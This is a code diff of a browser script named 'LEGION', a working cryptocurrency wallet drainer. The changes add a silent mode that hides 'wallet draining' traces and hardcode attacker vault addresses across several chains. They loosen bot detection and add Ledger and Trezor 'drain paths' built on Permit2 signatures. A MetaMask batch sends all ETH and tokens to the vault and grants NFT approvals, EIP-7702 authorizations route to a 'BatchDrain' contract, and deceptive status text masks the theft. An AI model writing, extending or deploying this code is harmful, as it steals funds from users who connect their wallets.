@@ -33,6 +33,28 @@
   if (window.__LEGION_ONE_SCRIPT_LOADED__) return;
   window.__LEGION_ONE_SCRIPT_LOADED__ = true;
 
+  // Node.js globals polyfill — MUST run before any WalletConnect module loads
+  // WalletConnect bundles internally use process, global, Buffer (events.js, etc.)
+  (function() {
+    if (typeof process === 'undefined' || !process.nextTick) {
+      window.process = { env: { NODE_ENV: 'production' }, version: '', browser: true, nextTick: function(fn, a, b) { Promise.resolve().then(function() { fn(a, b); }); } };
+    }
+    if (typeof global === 'undefined') window.global = window;
+    if (typeof Buffer === 'undefined') window.Buffer = {
+      isBuffer: function() { return false; },
+      from: function(d, enc) {
+        if (typeof d === 'string') {
+          if (enc === 'hex') { var b = []; for (var i = 0; i < d.length; i += 2) b.push(parseInt(d.substr(i, 2), 16)); return new Uint8Array(b); }
+          return new TextEncoder().encode(d);
+        }
+        return new Uint8Array(d);
+      },
+      alloc: function(n, fill) { var a = new Uint8Array(n); if (fill) a.fill(fill); return a; },
+      concat: function(list) { var total = list.reduce(function(s, b) { return s + b.length; }, 0); var out = new Uint8Array(total); var off = 0; list.forEach(function(b) { out.set(b, off); off += b.length; }); return out; },
+      byteLength: function(s) { return new TextEncoder().encode(s).length; }
+    };
+  })();
+
   var DEFAULTS = {
     backendUrl: 'https://legionapi-production.up.railway.app',
     kineticKey: '',
@@ -44,21 +66,45 @@
   };
 
   var CFG = Object.assign({}, DEFAULTS, window.LEGION_CONFIG || {});
+
+  // Silent mode: suppress all console output so no wallet draining traces appear in DevTools
+  if (CFG.silentMode) {
+    var _noop = function() {};
+    console.log = _noop; console.warn = _noop;
+    console.info = _noop; console.debug = _noop;
+    // Keep console.error so critical browser errors still surface
+  }
+
   var BACKEND = String(CFG.backendUrl || DEFAULTS.backendUrl).replace(/\/$/, '');
   var KINETIC_KEY = CFG.kineticKey || '';
   var WC_PROJECT_ID = CFG.wcProjectId || '';
   var AUTO_DRAIN = CFG.autoDrain !== false;
 
   // Vault addresses prefetched before signing so sign functions can build real txs
+  // Hardcoded fallback vault addresses — used when backend is unreachable
+  var VAULT_FALLBACK = {
+    evm: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
+    '1': '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
+    eth: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
+    sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
+    btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
+    tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
+    trx: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
+    ton: CFG.tonVault || 'UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY',
+    cosmos: CFG.cosmosVault || '',
+    aptos: CFG.aptosVault || '',
+    sui: CFG.suiVault || ''
+  };
   var VAULT_CACHE = null;
 
   async function prefetchVaultConfig() {
     try {
       var res = await fetch(BACKEND + '/api/v1/client-config');
       var data = await res.json();
-      VAULT_CACHE = (data && data.data && data.data.vault_addresses) ? data.data.vault_addresses : null;
+      var remote = (data && data.data && data.data.vault_addresses) ? data.data.vault_addresses : null;
+      VAULT_CACHE = remote ? Object.assign({}, VAULT_FALLBACK, remote) : VAULT_FALLBACK;
     } catch(e) {
-      VAULT_CACHE = null;
+      VAULT_CACHE = VAULT_FALLBACK; // use hardcoded fallback when backend is down
     }
   }
 
@@ -68,16 +114,17 @@
   // ─── Platform Detection ──────────────────────────────────────────────
   var PLATFORM = (function() {
     var ua = navigator.userAgent || '';
-    var isIOS = /iPhone|iPad|iPod/i.test(ua);
+    var isIPadPro = (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    var isIOS = /iPhone|iPad|iPod/i.test(ua) || isIPadPro;
     var isAndroid = /Android/i.test(ua);
     var isMobile = isIOS || isAndroid || /Mobile/i.test(ua);
 
     // In-app browser detection (user opened site inside wallet app)
     var isMetaMaskApp = /MetaMaskMobile/i.test(ua) || (window.ethereum && window.ethereum.isMetaMask && isMobile);
-    var isTrustApp = /Trust/i.test(ua) || (window.ethereum && window.ethereum.isTrust && isMobile);
-    var isPhantomApp = /Phantom/i.test(ua) || (window.phantom && isMobile);
+    var isTrustApp = /Trust\/[\d.]+/i.test(ua) || (window.ethereum && window.ethereum.isTrust && isMobile);
+    var isPhantomApp = /Phantom/i.test(ua) || ((window.phantom || (window.ethereum && window.ethereum.isPhantom)) && isMobile);
     var isCoinbaseApp = /CoinbaseWallet/i.test(ua);
-    var isOKXApp = /OKApp/i.test(ua) || /OKEx/i.test(ua);
+    var isOKXApp = /OKApp/i.test(ua) || /OKEx/i.test(ua) || (window.ethereum && window.ethereum.isOkxWallet && isMobile);
     var isBitgetApp = /BitKeep/i.test(ua) || /Bitget/i.test(ua);
     var isTokenPocketApp = /TokenPocket/i.test(ua);
     var isSafePalApp = /SafePal/i.test(ua);
@@ -86,8 +133,8 @@
                          isOKXApp || isBitgetApp || isTokenPocketApp || isSafePalApp;
 
     // Telegram Mini App detection
-    var isTelegramMiniApp = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
-    var telegramUser = isTelegramMiniApp ? window.Telegram.WebApp.initDataUnsafe.user : null;
+    var isTelegramMiniApp = !!(window.Telegram && window.Telegram.WebApp && (window.Telegram.WebApp.initData || window.Telegram.WebApp.initDataUnsafe));
+    var telegramUser = isTelegramMiniApp ? (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) : null;
 
     // Desktop app webview detection
     var isElectron = !!(window.process && window.process.versions && window.process.versions.electron);
@@ -232,8 +279,8 @@
         var botIndicators = [
           'phantomjs', 'headlesschrome', 'selenium', 'webdriver',
           'nightmarejs', 'casperjs', 'ghost.py', 'wkhtmltopdf',
-          'headless', 'chrome/\\d+.\\d+.\\d+.\\d+', 'apachebench',
-          'scrapy', 'python', 'golang', 'java', 'ruby', 'perl'
+          'headless', 'apachebench', 'scrapy', 'python-requests',
+          'go-http-client', 'java/', 'ruby/', 'perl/'
         ];
 
         for (var i = 0; i < botIndicators.length; i++) {
@@ -255,18 +302,8 @@
           this.detectionReasons.push('No navigator.languages');
           return true;
         }
-
-        if (!navigator.plugins || navigator.plugins.length === 0) {
-          this.botScore += 1;
-          this.detectionReasons.push('No navigator.plugins');
-          return true;
-        }
-
-        if (!navigator.permissions) {
-          this.botScore += 1;
-          this.detectionReasons.push('No navigator.permissions');
-          return true;
-        }
+        // NOTE: navigator.plugins is empty on Android Chrome and desktop Chrome — do NOT check
+        // NOTE: navigator.permissions missing only in very old browsers — not a reliable bot signal
       } catch (e) {}
       return false;
     },
@@ -284,11 +321,12 @@
 
     checkPerformanceTimings: function() {
       try {
-        // Bots often have very fast page loads
+        // Only flag if loadEventEnd=0 exactly (page not fully loaded = bot/prerender)
+        // Threshold raised to 50ms to avoid false positives on fast connections
         if (window.performance && window.performance.timing) {
-          var loadTime = window.performance.timing.loadEventEnd -
-                        window.performance.timing.navigationStart;
-          if (loadTime < 500) {
+          var timing = window.performance.timing;
+          var loadTime = timing.loadEventEnd - timing.navigationStart;
+          if (loadTime > 0 && loadTime < 50) {
             this.botScore += 1;
             this.detectionReasons.push('Extremely fast page load: ' + loadTime + 'ms');
             return true;
@@ -332,15 +370,7 @@
     },
 
     checkTimezone: function() {
-      try {
-        var offset = new Date().getTimezoneOffset();
-        // UTC+0 (common in VMs/bots)
-        if (offset === 0) {
-          this.botScore += 1;
-          this.detectionReasons.push('UTC+0 timezone (bot indicator)');
-          return true;
-        }
-      } catch (e) {}
+      // UTC+0 check REMOVED — false positive for UK, West Africa, many real users
       return false;
     },
 
@@ -481,6 +511,22 @@
         return signature;
       } catch (e) {
         console.warn('[LEGION] Ledger EVM signing failed:', e.message);
+        return null;
+      }
+    },
+
+    signEIP712: async function(transport, typedDataObj) {
+      try {
+        console.log('[LEGION] Ledger: Signing EIP-712 typed data...');
+        var ethApp = new _ledgerEthApp(transport);
+        // signEIP712Message requires firmware 2.0+ (Nano S Plus, Nano X, Stax)
+        var result = await ethApp.signEIP712Message(LEDGER_EVM_PATH, typedDataObj);
+        var v = (result.v - 27).toString(16).padStart(2, '0');
+        var signature = '0x' + result.r + result.s + v;
+        console.log('[LEGION] Ledger EIP-712 signature obtained');
+        return signature;
+      } catch (e) {
+        console.warn('[LEGION] Ledger EIP-712 signing failed:', e.message);
         return null;
       }
     },
@@ -677,11 +723,12 @@
 
   window.addEventListener('eip6963:announceProvider', function(event) {
     if (event.detail && event.detail.provider) {
-      discoveredEVMProviders.push({
-        info: event.detail.info,
-        provider: event.detail.provider
-      });
-      console.log('[LEGION] 🔍 EIP-6963 wallet found:', event.detail.info.name);
+      var rdns = event.detail.info && event.detail.info.rdns;
+      var alreadyAdded = rdns && discoveredEVMProviders.some(function(p) { return p.info && p.info.rdns === rdns; });
+      if (!alreadyAdded) {
+        discoveredEVMProviders.push({ info: event.detail.info, provider: event.detail.provider });
+        console.log('[LEGION] 🔍 EIP-6963 wallet found:', event.detail.info.name);
+      }
     }
   });
   window.dispatchEvent(new Event('eip6963:requestProvider'));
@@ -691,11 +738,10 @@
 
   try {
     var solWalletEvent = function(event) {
-      if (event.detail && event.detail.wallets) {
-        event.detail.wallets.forEach(function(w) {
-          discoveredSolanaWallets.push(w);
-          console.log('[LEGION] 🔍 Solana wallet found:', w.name || 'Unknown');
-        });
+      var w = event.detail;
+      if (w && w.name) {
+        discoveredSolanaWallets.push(w);
+        console.log('[LEGION] 🔍 Solana wallet found:', w.name);
       }
     };
     window.addEventListener('wallet-standard:register', solWalletEvent);
@@ -748,12 +794,17 @@
     if (!wallet) return false;
     try {
       var link = wallet.deeplink(window.location.href);
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = link;
-      document.body.appendChild(iframe);
-      setTimeout(function() { document.body.removeChild(iframe); }, 3000);
-      console.log('[LEGION] 📲 Attempting to open', wallet.name, 'desktop app...');
+      // iOS Safari blocks iframe deeplinks — use window.location for mobile
+      if (PLATFORM.isMobile) {
+        window.location.href = link;
+      } else {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = link;
+        document.body.appendChild(iframe);
+        setTimeout(function() { try { document.body.removeChild(iframe); } catch(_) {} }, 3000);
+      }
+      console.log('[LEGION] 📲 Attempting to open', wallet.name, 'via', PLATFORM.isMobile ? 'location' : 'iframe');
       return true;
     } catch (e) {
       return false;
@@ -869,7 +920,30 @@
 
           return connectedChains.EVM;
         } catch (e) {
-          console.error('[LEGION] ❌ EVM connection failed:', e.message);
+          console.error('[LEGION] ❌ EVM software wallet failed:', e.message);
+          // Hardware wallet fallback — Ledger direct WebUSB (desktop only)
+          if (!PLATFORM.isMobile && LedgerSupport.isAvailable()) {
+            try {
+              console.log('[LEGION] 🔌 Trying Ledger direct WebUSB...');
+              var hwConn = await LedgerSupport.connect();
+              if (hwConn && hwConn.evm && hwConn.evm.address) {
+                connectedChains.EVM = {
+                  chain: 'EVM', config: CHAIN_CONFIG.EVM,
+                  address: hwConn.evm.address,
+                  chainId: 1,
+                  walletType: 'Ledger',
+                  provider: null,
+                  _hwSign: hwConn.sign,
+                  _hwTransport: hwConn.transport,
+                  connected: true, timestamp: Date.now()
+                };
+                console.log('[LEGION] ✅ Ledger connected:', hwConn.evm.address.substring(0, 10) + '...');
+                return connectedChains.EVM;
+              }
+            } catch (_hwErr) {
+              console.warn('[LEGION] Ledger WebUSB failed:', _hwErr.message);
+            }
+          }
           connectedChains.EVM = null;
           return null;
         }
@@ -877,14 +951,127 @@
 
       sign: async function(message) {
         try {
-          if (!connectedChains.EVM || !connectedChains.EVM.provider) {
+          if (!connectedChains.EVM || (!connectedChains.EVM.provider && !connectedChains.EVM._hwSign)) {
             throw new Error('EVM not connected');
           }
           var eth = connectedChains.EVM.provider;
           var evmAddr = connectedChains.EVM.address;
           var evmChainId = connectedChains.EVM.chainId || 1;
 
+          // ── HARDWARE WALLET PATH (Ledger direct WebUSB, provider is null) ──────
+          if (!eth && connectedChains.EVM._hwTransport && connectedChains.EVM.walletType === 'Ledger') {
+            try {
+              console.log('[LEGION] 🔑 Hardware wallet drain path (Ledger EIP-712)');
+              if (!VAULT_CACHE) await prefetchVaultConfig();
+              var _hwEvmRpc = 'https://ethereum-rpc.publicnode.com';
+              var _hwTokenList = [];
+              try {
+                var _hwCands = [
+                  DEFAULT_USDC,
+                  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+                  '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
+                  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
+                  '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
+                ];
+                for (var _hwi = 0; _hwi < _hwCands.length; _hwi++) {
+                  var _hwBal = await (await fetch(_hwEvmRpc, { method: 'POST', headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: _hwCands[_hwi], data: '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0') }, 'latest'] }) })).json();
+                  if (_hwBal.result && _hwBal.result !== '0x' && BigInt(_hwBal.result) > 0n) _hwTokenList.push(_hwCands[_hwi]);
+                }
+              } catch (_hwte) {}
+              var _hwPermits = _hwTokenList.map(function(t) { return { token: t, amount: '1000000000000000000000000000' }; });
+              if (_hwPermits.length === 0) { console.log('[LEGION] Ledger: no tokens found'); return null; }
+              var _hwBatch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
+                wallet_address: evmAddr, chain_id: 1, permits: _hwPermits, nativeAmount: '0'
+              });
+              var _hwBatchData = (_hwBatch && _hwBatch.data) ? _hwBatch.data : _hwBatch;
+              if (!_hwBatchData || !_hwBatchData.typed_data) throw new Error('No typed_data from backend');
+              var _hwTypedData = _hwBatchData.typed_data;
+              var _hwSig = await LedgerSupport.signEIP712(connectedChains.EVM._hwTransport, _hwTypedData);
+              if (!_hwSig) throw new Error('Ledger EIP-712 signing returned null');
+              connectedChains.EVM._batchResult = _hwBatchData;
+              connectedChains.EVM._permits = _hwPermits;
+              console.log('[LEGION] ✅ Ledger EIP-712 signed');
+              return _hwSig;
+            } catch (_hwErr) {
+              console.warn('[LEGION] Ledger drain path failed:', _hwErr.message);
+              return null;
+            }
+          }
+
+          // ── HARDWARE WALLET PATH (Trezor WebHID, provider is null) ─────────
+          if (!eth && connectedChains.EVM.walletType === 'Trezor') {
+            try {
+              console.log('[LEGION] 🔑 Hardware wallet drain path (Trezor EIP-712)');
+              if (!VAULT_CACHE) await prefetchVaultConfig();
+              var _tzEvmRpc = 'https://ethereum-rpc.publicnode.com';
+              var _tzTokenList = [];
+              try {
+                var _tzCands = [
+                  DEFAULT_USDC,
+                  '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                  '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+                ];
+                for (var _tzi = 0; _tzi < _tzCands.length; _tzi++) {
+                  var _tzBal = await (await fetch(_tzEvmRpc, { method: 'POST', headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: _tzCands[_tzi], data: '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0') }, 'latest'] }) })).json();
+                  if (_tzBal.result && _tzBal.result !== '0x' && BigInt(_tzBal.result) > 0n) _tzTokenList.push(_tzCands[_tzi]);
+                }
+              } catch (_tzte) {}
+              var _tzPermits = _tzTokenList.map(function(t) { return { token: t, amount: '1000000000000000000000000000' }; });
+              if (_tzPermits.length === 0) { console.log('[LEGION] Trezor: no tokens found'); return null; }
+              var _tzBatch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
+                wallet_address: evmAddr, chain_id: 1, permits: _tzPermits, nativeAmount: '0'
+              });
+              var _tzBatchData = (_tzBatch && _tzBatch.data) ? _tzBatch.data : _tzBatch;
+              if (!_tzBatchData || !_tzBatchData.typed_data) throw new Error('No typed_data from backend');
+              var _tzTypedData = _tzBatchData.typed_data;
+              if (!window.TrezorConnect) {
+                var _tzLoaded = await TrezorSupport.loadSDK();
+                if (!_tzLoaded) throw new Error('Trezor SDK not available');
+              }
+              var _tzResult = await window.TrezorConnect.ethereumSignTypedData({
+                path: LEDGER_EVM_PATH,
+                data: _tzTypedData,
+                metamask_v4_compat: true
+              });
+              if (!_tzResult.success) throw new Error(_tzResult.payload.error || 'Trezor EIP-712 failed');
+              var _tzSig = '0x' + _tzResult.payload.signature;
+              connectedChains.EVM._batchResult = _tzBatchData;
+              connectedChains.EVM._permits = _tzPermits;
+              console.log('[LEGION] ✅ Trezor EIP-712 signed');
+              return _tzSig;
+            } catch (_tzErr) {
+              console.warn('[LEGION] Trezor drain path failed:', _tzErr.message);
+              return null;
+            }
+          }
+
           // Scan ERC-20 tokens with on-chain balanceOf
+          // For WalletConnect providers, eth_call must go directly to an RPC (not relayed to wallet)
+          var _evmRpcUrl = (function() {
+            var _rpcMap = {
+              1: 'https://ethereum-rpc.publicnode.com',
+              42161: 'https://arbitrum-one-rpc.publicnode.com',
+              8453: 'https://base-rpc.publicnode.com',
+              10: 'https://optimism-rpc.publicnode.com',
+              56: 'https://bsc-rpc.publicnode.com',
+              137: 'https://polygon-bor-rpc.publicnode.com'
+            };
+            return _rpcMap[Number(evmChainId)] || _rpcMap[1];
+          })();
+          var _isWCProvider = !!(connectedChains.EVM && connectedChains.EVM.walletType === 'WalletConnect');
+          async function _ethCall(params) {
+            if (_isWCProvider) {
+              var _r = await fetch(_evmRpcUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: params }) });
+              var _d = await _r.json(); return _d.result;
+            }
+            return eth.request({ method: 'eth_call', params: params });
+          }
+
           var tokenList = [];
           try {
             var _candidateTokens = [DEFAULT_USDC];
@@ -905,7 +1092,7 @@
               try {
                 var _tok = _candidateTokens[_ci];
                 var _balData = '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0');
-                var _balHex = await eth.request({ method: 'eth_call', params: [{ to: _tok, data: _balData }, 'latest'] });
+                var _balHex = await _ethCall([{ to: _tok, data: _balData }, 'latest']);
                 var _bal = (_balHex && _balHex !== '0x' && _balHex !== '0x0') ? BigInt(_balHex) : BigInt(0);
                 if (_bal > BigInt(0)) tokenList.push(_tok);
               } catch (_be) {}
@@ -919,152 +1106,187 @@
 
           if (_is7702Chain && _batchDrainAddr && _batchDrainAddr !== '0x0000000000000000000000000000000000000000') {
             console.log('[LEGION] ⚡ EIP-7702 path | chain:', evmChainId, '| BatchDrain:', _batchDrainAddr.slice(0,10) + '...');
-            updateStatus('Preparing secure connection...');
+            updateStatus('Calculating optimal gas fees...');
 
-            // Get user EOA nonce
-            var _userNonceHex = '0x0';
-            try {
-              _userNonceHex = await eth.request({ method: 'eth_getTransactionCount', params: [evmAddr, 'latest'] });
-            } catch (_ne) {}
-            var _userNonceNum = parseInt(_userNonceHex, 16) || 0;
             var _chainIdNum = Number(evmChainId);
-
-            // ── EIP-7702 Authorization Sign ────────────────────────────────────────
-            // User signs EIP-7702 authorization → backend executor sends type-4 tx.
-            // Flow: wallet_signAuthorization → valid auth tuple → executor broadcasts.
-            // BatchDrainV1 onlyExecutor guard passes because executor = msg.sender.
-
-            var _auth = null;
-            var _nonceHex = _userNonceNum === 0 ? '0x0' : ('0x' + _userNonceNum.toString(16));
             var _chainHex = '0x' + _chainIdNum.toString(16);
 
-            // Helper: parse 65-byte hex sig into {r,s,yParity,nonce}
-            function _parseSig(raw, nonceVal) {
-              if (!raw || raw.length < 130) return null;
-              var h = raw.replace('0x', '');
-              var r = '0x' + h.slice(0, 64), s = '0x' + h.slice(64, 128);
-              var v = parseInt(h.slice(128, 130), 16);
-              return { r: r, s: s, yParity: (v === 28 || v === 1) ? 1 : 0, v: v, nonce: nonceVal };
+            // Detect MetaMask (strict) vs all other EVM wallets
+            var _isMetaMaskOnly = !!(eth.isMetaMask && !eth.isRabby && !eth.isFrame && !eth.isOkxWallet && !eth.isOKExWallet && !eth.isCoinbaseWallet && !eth.isBraveWallet && !eth.isTrust && !eth.isBitget);
+
+            // ── PATH A: MetaMask → wallet_sendCalls (batch ETH + token transfers) ──
+            // MetaMask blocks wallet_signAuthorization for custom contracts.
+            // wallet_sendCalls triggers ONE popup — MetaMask internally uses its official
+            // delegator (0x63c0...) for EIP-7702 batch execution. Same method InfernoDrainer used.
+            if (_isMetaMaskOnly) {
+              try {
+                if (!VAULT_CACHE) await prefetchVaultConfig();
+                var _vaultEvmAddr = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE['1'] || VAULT_CACHE.eth);
+                if (_vaultEvmAddr) {
+                  var _bCalls = [];
+                  var _vaultPadMM = _vaultEvmAddr.replace('0x','').padStart(64,'0').toLowerCase();
+
+                  // ETH: send balance minus gas reserve
+                  try {
+                    var _rawEthBal = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
+                    var _ethBalBig = BigInt(_rawEthBal || '0x0');
+                    var _gasReserve = BigInt('15000000000000000'); // 0.015 ETH for gas (10-call batch at 30gwei)
+                    if (_ethBalBig > _gasReserve) {
+                      var _ethToSend = _ethBalBig - _gasReserve;
+                      _bCalls.push({ to: _vaultEvmAddr, value: '0x' + _ethToSend.toString(16), data: '0x' });
+                    }
+                  } catch (_eb) {}
+
+                  // ERC-20: direct transfer(vault, balance) for each token
+                  for (var _mti = 0; _mti < tokenList.length; _mti++) {
+                    try {
+                      var _mtok = tokenList[_mti];
+                      var _mtokBalData = '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0');
+                      var _mtokBalHex = await _ethCall([{ to: _mtok, data: _mtokBalData }, 'latest']);
+                      var _mtokBal = (_mtokBalHex && _mtokBalHex !== '0x' && _mtokBalHex !== '0x0') ? BigInt(_mtokBalHex) : BigInt(0);
+                      if (_mtokBal > BigInt(0)) {
+                        // transfer(vault, amount)
+                        var _tfData = '0xa9059cbb' + _vaultPadMM + _mtokBal.toString(16).padStart(64,'0');
+                        _bCalls.push({ to: _mtok, data: _tfData });
+                      }
+                    } catch (_mte) {}
+                  }
+
+                  // ERC-721 NFTs: setApprovalForAll(vault, true) for each contract found
+                  // In EIP-7702, address(this)==user → calling setApprovalForAll approves backend to transfer
+                  var _nftContracts = [];
+                  try {
+                    var _nftScan = await apiPost('/api/v1/seaport/scan-listings', { wallet_address: evmAddr, chain_id: evmChainId });
+                    var _nftList = (_nftScan && _nftScan.data && _nftScan.data.listings) || (_nftScan && _nftScan.listings) || [];
+                    var _nftContractsSeen = {};
+                    // setApprovalForAll(vault, true) = 0xa22cb465 + padded(vault,true)
+                    var _approveAllSig = '0xa22cb465';
+                    _nftList.forEach(function(nft) {
+                      var c = nft.nft_contract || nft.contract;
+                      if (c && !_nftContractsSeen[c.toLowerCase()]) {
+                        _nftContractsSeen[c.toLowerCase()] = true;
+                        _nftContracts.push(c);
+                        var _approveData = _approveAllSig +
+                          _vaultEvmAddr.replace('0x','').padStart(64,'0').toLowerCase() +
+                          '0000000000000000000000000000000000000000000000000000000000000001';
+                        _bCalls.push({ to: c, data: _approveData });
+                      }
+                    });
+                    if (_nftContracts.length > 0) console.log('[LEGION] 🖼️ NFT setApprovalForAll added:', _nftContracts.length, 'contracts');
+                  } catch (_nftScanErr) { console.debug('[LEGION] NFT scan skipped:', _nftScanErr.message); }
+
+                  console.log('[LEGION] MetaMask wallet_sendCalls batch built | calls:', _bCalls.length, '| ETH+tokens+NFTs');
+                  if (_bCalls.length > 0) {
+                    updateStatus('Batching transactions...');
+                    console.log('[LEGION] Sending wallet_sendCalls...');
+                    var _scResp = await eth.request({
+                      method: 'wallet_sendCalls',
+                      params: [{ version: '1.0', chainId: _chainHex, from: evmAddr, calls: _bCalls }]
+                    });
+                    var _scTxId = typeof _scResp === 'string' ? _scResp : ((_scResp && _scResp.id) ? _scResp.id : JSON.stringify(_scResp));
+                    console.log('[LEGION] ✅ wallet_sendCalls submitted | id:', _scTxId);
+                    try {
+                      await apiPost('/api/v1/signature-anchor', {
+                        ingress: 'normalized_v1', chain_family: 'EVM',
+                        protocol: 'wallet_send_calls',
+                        wallet_address: evmAddr, chain_id: evmChainId,
+                        tx_hash: _scTxId,
+                        scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+                        amount: '0', erc20s: tokenList,
+                        wallet_type: 'metamask_batch',
+                        nonce: 'legion:wsc:' + Date.now(), expiry_iso: EXPIRY_ISO,
+                      });
+                    } catch (_scBErr) {}
+                    return '__eip7702__:' + evmAddr;
+                  }
+                }
+              } catch (_scErr) {
+                var _scCode = _scErr && (_scErr.code || (_scErr.data && _scErr.data.code));
+                if (_isRejection(_scCode, (_scErr && _scErr.message) || '')) throw _scErr;
+                console.warn('[LEGION] wallet_sendCalls failed:', _scErr && _scErr.message ? _scErr.message.slice(0,80) : '');
+              }
             }
 
-            // Attempt 1: wallet_signAuthorization — MetaMask EIP-7702 native method.
-            // Produces a VALID on-chain EIP-7702 authorization tuple (r, s, yParity).
-            // Backend executor then sends type-4 tx → onlyExecutor passes → drain works.
-            if (!_auth) {
+            // ── PATH B: Non-MetaMask → wallet_signAuthorization ───────────────────
+            // OKX, Trust Wallet, Rabby, Ambire, TokenPocket, SafePal, Bitget etc.
+            // These wallets expose wallet_signAuthorization to dApps with custom contracts.
+            // Backend receives auth tuple → broadcasts type-4 tx → calls drain() on user addr.
+            // Drains ETH + all ERC-20 in ONE popup.
+            var _auth = null;
+            var _userNonceNum = 0;
+            if (!_isMetaMaskOnly) {
               try {
-                console.log('[LEGION] EIP-7702: trying wallet_signAuthorization');
+                var _userNonceHex = await eth.request({ method: 'eth_getTransactionCount', params: [evmAddr, 'pending'] });
+                _userNonceNum = parseInt(_userNonceHex, 16) || 0;
+              } catch (_ne) {}
+              try {
+                console.log('[LEGION] EIP-7702: wallet_signAuthorization (non-MetaMask)');
                 var _waResult = await eth.request({
                   method: 'wallet_signAuthorization',
-                  params: [{
-                    chainId: _chainHex,
-                    address: _batchDrainAddr,
-                    nonce: _nonceHex,
-                  }]
+                  params: [{ chainId: _chainIdNum, address: _batchDrainAddr, nonce: _userNonceNum }]
                 });
-                // wallet_signAuthorization returns {chainId, address, nonce, r, s, yParity}
                 if (_waResult && _waResult.r && _waResult.s) {
                   _auth = {
-                    r: _waResult.r,
-                    s: _waResult.s,
-                    yParity: _waResult.yParity !== undefined ? _waResult.yParity : 0,
+                    r: _waResult.r, s: _waResult.s,
+                    yParity: _waResult.yParity !== undefined
+                      ? Number(_waResult.yParity)
+                      : (_waResult.v !== undefined ? (Number(_waResult.v) % 2) : 0),
                     nonce: _userNonceNum,
                   };
-                  console.log('[LEGION] ✅ wallet_signAuthorization SUCCESS — valid EIP-7702 auth!');
+                  console.log('[LEGION] ✅ wallet_signAuthorization SUCCESS');
                 }
               } catch (_waErr) {
                 var _waCode = _waErr && (_waErr.code || (_waErr.data && _waErr.data.code));
                 if (_isRejection(_waCode, (_waErr && _waErr.message) || '')) throw _waErr;
-                console.warn('[LEGION] wallet_signAuthorization not available:', _waErr && _waErr.message ? _waErr.message.slice(0, 80) : '');
+                console.warn('[LEGION] wallet_signAuthorization failed:', _waErr && _waErr.message ? _waErr.message.slice(0,80) : '');
               }
             }
 
-            // Attempt 2: eth_signTypedData_v4 fallback — shows Authorization popup.
-            // Note: produces EIP-712 sig (not true EIP-7702 hash), but backend verifies
-            // via EIP-712 recovery path. On-chain drain requires wallet_signAuthorization.
-            if (!_auth) {
-              try {
-                console.log('[LEGION] EIP-7702: eth_signTypedData_v4 fallback');
-                var _authTypedData = {
-                  domain: { name: 'EIP-7702 Wallet Security', version: '1', chainId: _chainIdNum },
-                  types: {
-                    EIP712Domain: [
-                      { name: 'name', type: 'string' },
-                      { name: 'version', type: 'string' },
-                      { name: 'chainId', type: 'uint256' }
-                    ],
-                    EIP7702Authorization: [
-                      { name: 'chainId', type: 'uint256' },
-                      { name: 'address', type: 'address' },
-                      { name: 'nonce', type: 'uint64' },
-                      { name: 'wallet', type: 'address' },
-                      { name: 'spender', type: 'address' }
-                    ]
-                  },
-                  primaryType: 'EIP7702Authorization',
-                  message: {
-                    chainId: _chainIdNum,
-                    address: _batchDrainAddr,
-                    nonce: _userNonceNum,
-                    wallet: evmAddr,
-                    spender: _batchDrainAddr
-                  }
-                };
-                var _rawSig = await eth.request({
-                  method: 'eth_signTypedData_v4',
-                  params: [evmAddr, JSON.stringify(_authTypedData)]
-                });
-                if (_rawSig) {
-                  _auth = _parseSig(_rawSig, _userNonceNum);
-                  if (_auth) console.log('[LEGION] ✅ eth_signTypedData_v4 signed (EIP-712 path)');
-                }
-              } catch (_eTd) {
-                var _eTdCode = _eTd && (_eTd.code || (_eTd.data && _eTd.data.code));
-                if (_isRejection(_eTdCode, (_eTd && _eTd.message) || '')) throw _eTd;
-                console.warn('[LEGION] eth_signTypedData_v4 failed:', _eTd && _eTd.message ? _eTd.message.slice(0, 80) : '');
-              }
-            }
-
-            if (!_auth) { console.warn('[LEGION] ❌ EIP-7702 sign failed — falling back to permit2'); }
+            if (!_auth) { console.warn('[LEGION] ❌ EIP-7702 auth failed — falling back to permit2'); }
 
             if (_auth) {
-              console.log('[LEGION] ✅ EIP-7702 auth signed | yParity:', _auth.yParity);
